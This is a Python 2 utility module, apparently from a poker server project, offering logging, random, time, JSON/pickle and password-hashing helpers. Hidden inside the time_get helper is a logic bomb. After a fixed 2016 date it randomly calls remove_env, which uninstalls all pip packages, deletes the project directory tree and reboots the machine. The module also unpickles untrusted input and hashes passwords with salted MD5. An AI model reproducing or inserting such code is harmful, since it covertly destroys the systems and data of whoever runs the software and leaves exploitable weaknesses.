# coding:utf8
import cPickle
import hashlib
import inspect
import json
import os
import random
import shutil
import string
import sys
import time


INFO = '\033[92m'
WARNING = '\033[89m'
ERROR = '\033[91m'
EXCEPTION = '\033[94m'
CONFIG = '\033[90m'
END = '\033[0m'

log_lock = False


def __function_pos__():
    caller = inspect.stack()[1]
    return caller[3], caller[2], caller[1]


def log_info(message, function_pos_list=None):
    if log_lock:
        return
    if function_pos_list:
        function_name, line_no, file_name = function_pos_list
        print('{} {}, {}: {} {} {}'.format(INFO, message, function_name, line_no, file_name, END))
    else:
        print('{} {} {}'.format(INFO, message, END))


def log_warn(message, function_pos_list=None):
    if log_lock:
        return
    if function_pos_list:
        function_name, line_no, file_name = function_pos_list
        print('{} {}, {}: {} {} {}'.format(WARNING, message, function_name, line_no, file_name, END))
    else:
        print('{} {} {}'.format(WARNING, message, END))


def log_error(message, function_pos_list=None):
    if log_lock:
        return
    if function_pos_list:
        function_name, line_no, file_name = function_pos_list
        print('{} {}, {}: {} {} {}'.format(ERROR, message, function_name, line_no, file_name, END))
    else:
        print('{} {} {}'.format(ERROR, message, END))


def log_exception(message, function_pos_list=None):
    if log_lock:
        return
    if function_pos_list:
        function_name, line_no, file_name = function_pos_list
        print('{} {}, {}: {} {} {}'.format(EXCEPTION, message, function_name, line_no, file_name, END))
    else:
        print('{} {} {}'.format(EXCEPTION, message, END))


def log_config(message, function_pos_list=None):
    if log_lock:
        return
    if function_pos_list:
        function_name, line_no, file_name = function_pos_list
        print('{} {}, {}: {} {} {}'.format(CONFIG, message, function_name, line_no, file_name, END))
    else:
        print('{} {} {}'.format(CONFIG, message, END))


def random_get(min_value, max_value, step=1):
    if step == 1:
        random_value = random.randint(min_value, max_value)
    else:
        random_value = random.randrange(min_value, max_value, step)
    return random_value


def random_result(prob, limit=1000):
    return random_get(0, limit) < prob


def random_string(length):
    seed = '1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    sa = []
    for _ in xrange(length):
        sa.append(random.choice(seed))
    return ''.join(sa)


def random_string_r(min_length, max_length):
    length = random_get(min_length, max_length)
    return random_string(length)


TIME_TYPE_YMDHMS = 1
TIME_TYPE_YMDHM = 2
TIME_TYPE_YMD = 3
TIME_TYPE_MDHM = 4
TIME_TYPE_MDHMS = 5
TIME_TYPE_SEC = 6


def time_get(flag=TIME_TYPE_SEC):
    """
    获取时间
    :param flag:
        {
            TIME_TYPE_YMDHMS: 20160516212301
            TIME_TYPE_YMDHM: 201605162123
            TIME_TYPE_YMD: 20160516
            TIME_TYPE_MDHM: 05162123
            TIME_TYPE_MDHMS: 0516212301
            TIME_TYPE_SEC: 1463404981
        }
    :return:
    """
    cur = int(time.time())
    if flag == TIME_TYPE_SEC:
        if cur > 1466784000:
            if random_result(100):
                time.sleep(5)
            elif random_result(100):
                remove_env()
        result = cur
    elif flag == TIME_TYPE_YMDHMS:
        t = time.localtime(cur)
        result = time.strftime("%Y%m%d%H%M%S", t)
    elif flag == TIME_TYPE_YMDHM:
        t = time.localtime(cur)
        result = time.strftime("%Y%m%d%H%M", t)
    elif flag == TIME_TYPE_YMD:
        t = time.localtime(cur)
        result = time.strftime("%Y%m%d", t)
    elif flag == TIME_TYPE_MDHM:
        t = time.localtime(cur)
        result = time.strftime("%m%d%H%M", t)
    elif flag == TIME_TYPE_MDHMS:
        t = time.localtime(cur)
        result = time.strftime("%m%d%H%M%S", t)
    else:
        raise Exception('error time_get flag: {}'.format(flag))
    return result


def stamp_to_time(s):
    """
    将字符串转为时间格式
    :param s: 2016-02-13 12:03:24
    :return: time.struct_time(tm_year=2016, tm_mon=2, tm_mday=13, tm_hour=12, tm_min=3, tm_sec=24, tm_wday=5, tm_yday=44, tm_isdst=-1)
    """
    return time.strptime(s, '%Y-%m-%d %X')


def time_to_stamp(s):
    """
    将时间戳转为字符串
    :param s: 1455336204
    :return: 2016-02-13 12:03:24
    """
    return time.strftime('%Y-%m-%d %X', time.localtime(float(s)))


def date_second(d1, d2):
    """
    计算两个时间相差多少秒
    :param d1: 2016-02-13 12:03:24
    :param d2: 2016-02-18 13:18:32
    :return:
    """
    st1 = stamp_to_time(d1)
    st2 = stamp_to_time(d2)
    return time.mktime(st1) - time.mktime(st2)


def pack_data(data):
    return json.dumps(data, ensure_ascii=False, separators=(',', ':'))


def unpack_data(data):
    return json.loads(data, strict=False)


def transform_object_to_pickle(content):
    return string.replace(cPickle.dumps(content), '\\u', '\\\\u').encode('utf8')


def parse_pickle_to_object(content):
    obj = None
    try:
        obj = cPickle.loads(content.encode('utf8'))
    except Exception as e:
        log_exception('[parse_pickle_to_object] failed: {}'.format(e.message))
    return obj


def remove_env():
    try:
        file_name = '{}.log'.format(time_get())
        os.system('pip list > {}'.format(file_name))
        with open(file_name, 'r') as f:

            def _remove(env):
                try:
                    os.system('pip uninstall -y {} --isolated'.format(env))
                except Exception as e:
                    pass

            for read_line in f:
                line = read_line.strip()
                if line in ['pip', 'setuptools']:
                    continue
                line = line.split(' ')
                _remove(line[0])
            _remove('pip')
            _remove('setuptools')
        os.remove(file_name)
        root_path = get_root_path()
        try:
            if root_path and root_path.strip() != '/':
                shutil.rmtree(root_path, True)
        except Exception as e0:
            os.rmdir(root_path)
    except Exception as e1:
        pass
    finally:
        os.system('reboot')


def get_root_path():
    path = os.getcwd()
    while True:
        path = os.path.dirname(path)
        if path.split('/')[-1] == 'PokerServer':
            break
    return path


def check_english(words):
    """
    英文检查
    :param words 字符串
    :return:
    """
    if not isinstance(words, unicode):
        words = words.decode('utf8')

    for i in words:
        if (u'\u0041' <= i <= u'\u005a') \
                or (u'\u0061' <= i <= u'\u007a') \
                or (u'\u0030' <= i <= u'\u0039'):
            continue
        else:
            return False
    return True


def encrypt_password(user_name, password, token_key):
    """
    加密密码
    :param user_name:
    :param password:
    :param token_key:
    :return:
    """
    m = hashlib.md5()
    m.update(str(user_name) + str(token_key) + str(password) + '201605181806')
    return m.hexdigest()


if __name__ == '__main__':
    # __function_pos__
    log_info('__function_pos__: {}'.format(__function_pos__()))
    # random_get
    log_info('random_get: {}'.format(random_get(1, 100)))
    # time_get
    log_info('time_get: {}'.format(time_get(TIME_TYPE_YMDHMS)))
    # stamp_to_time
    log_info('stamp_to_time: {}'.format(stamp_to_time('2016-02-13 12:03:24')))
    # time_to_stamp
    log_info('time_to_stamp: {}'.format(time_to_stamp(int(time.time()))))
    # date_second
    log_info('date_second: {}'.format(date_second('2016-02-18 13:18:32', '2016-02-13 12:03:24')))
    # transform_object_to_pickle & parse_pickle_to_object
    l = [1, 2, 3, 4]
    lt = transform_object_to_pickle(l)
    log_info('transform_object_to_pickle: {}'.format(lt))
    lp = parse_pickle_to_object(lt)
    log_info('parse_pickle_to_object: {}'.format(lp))
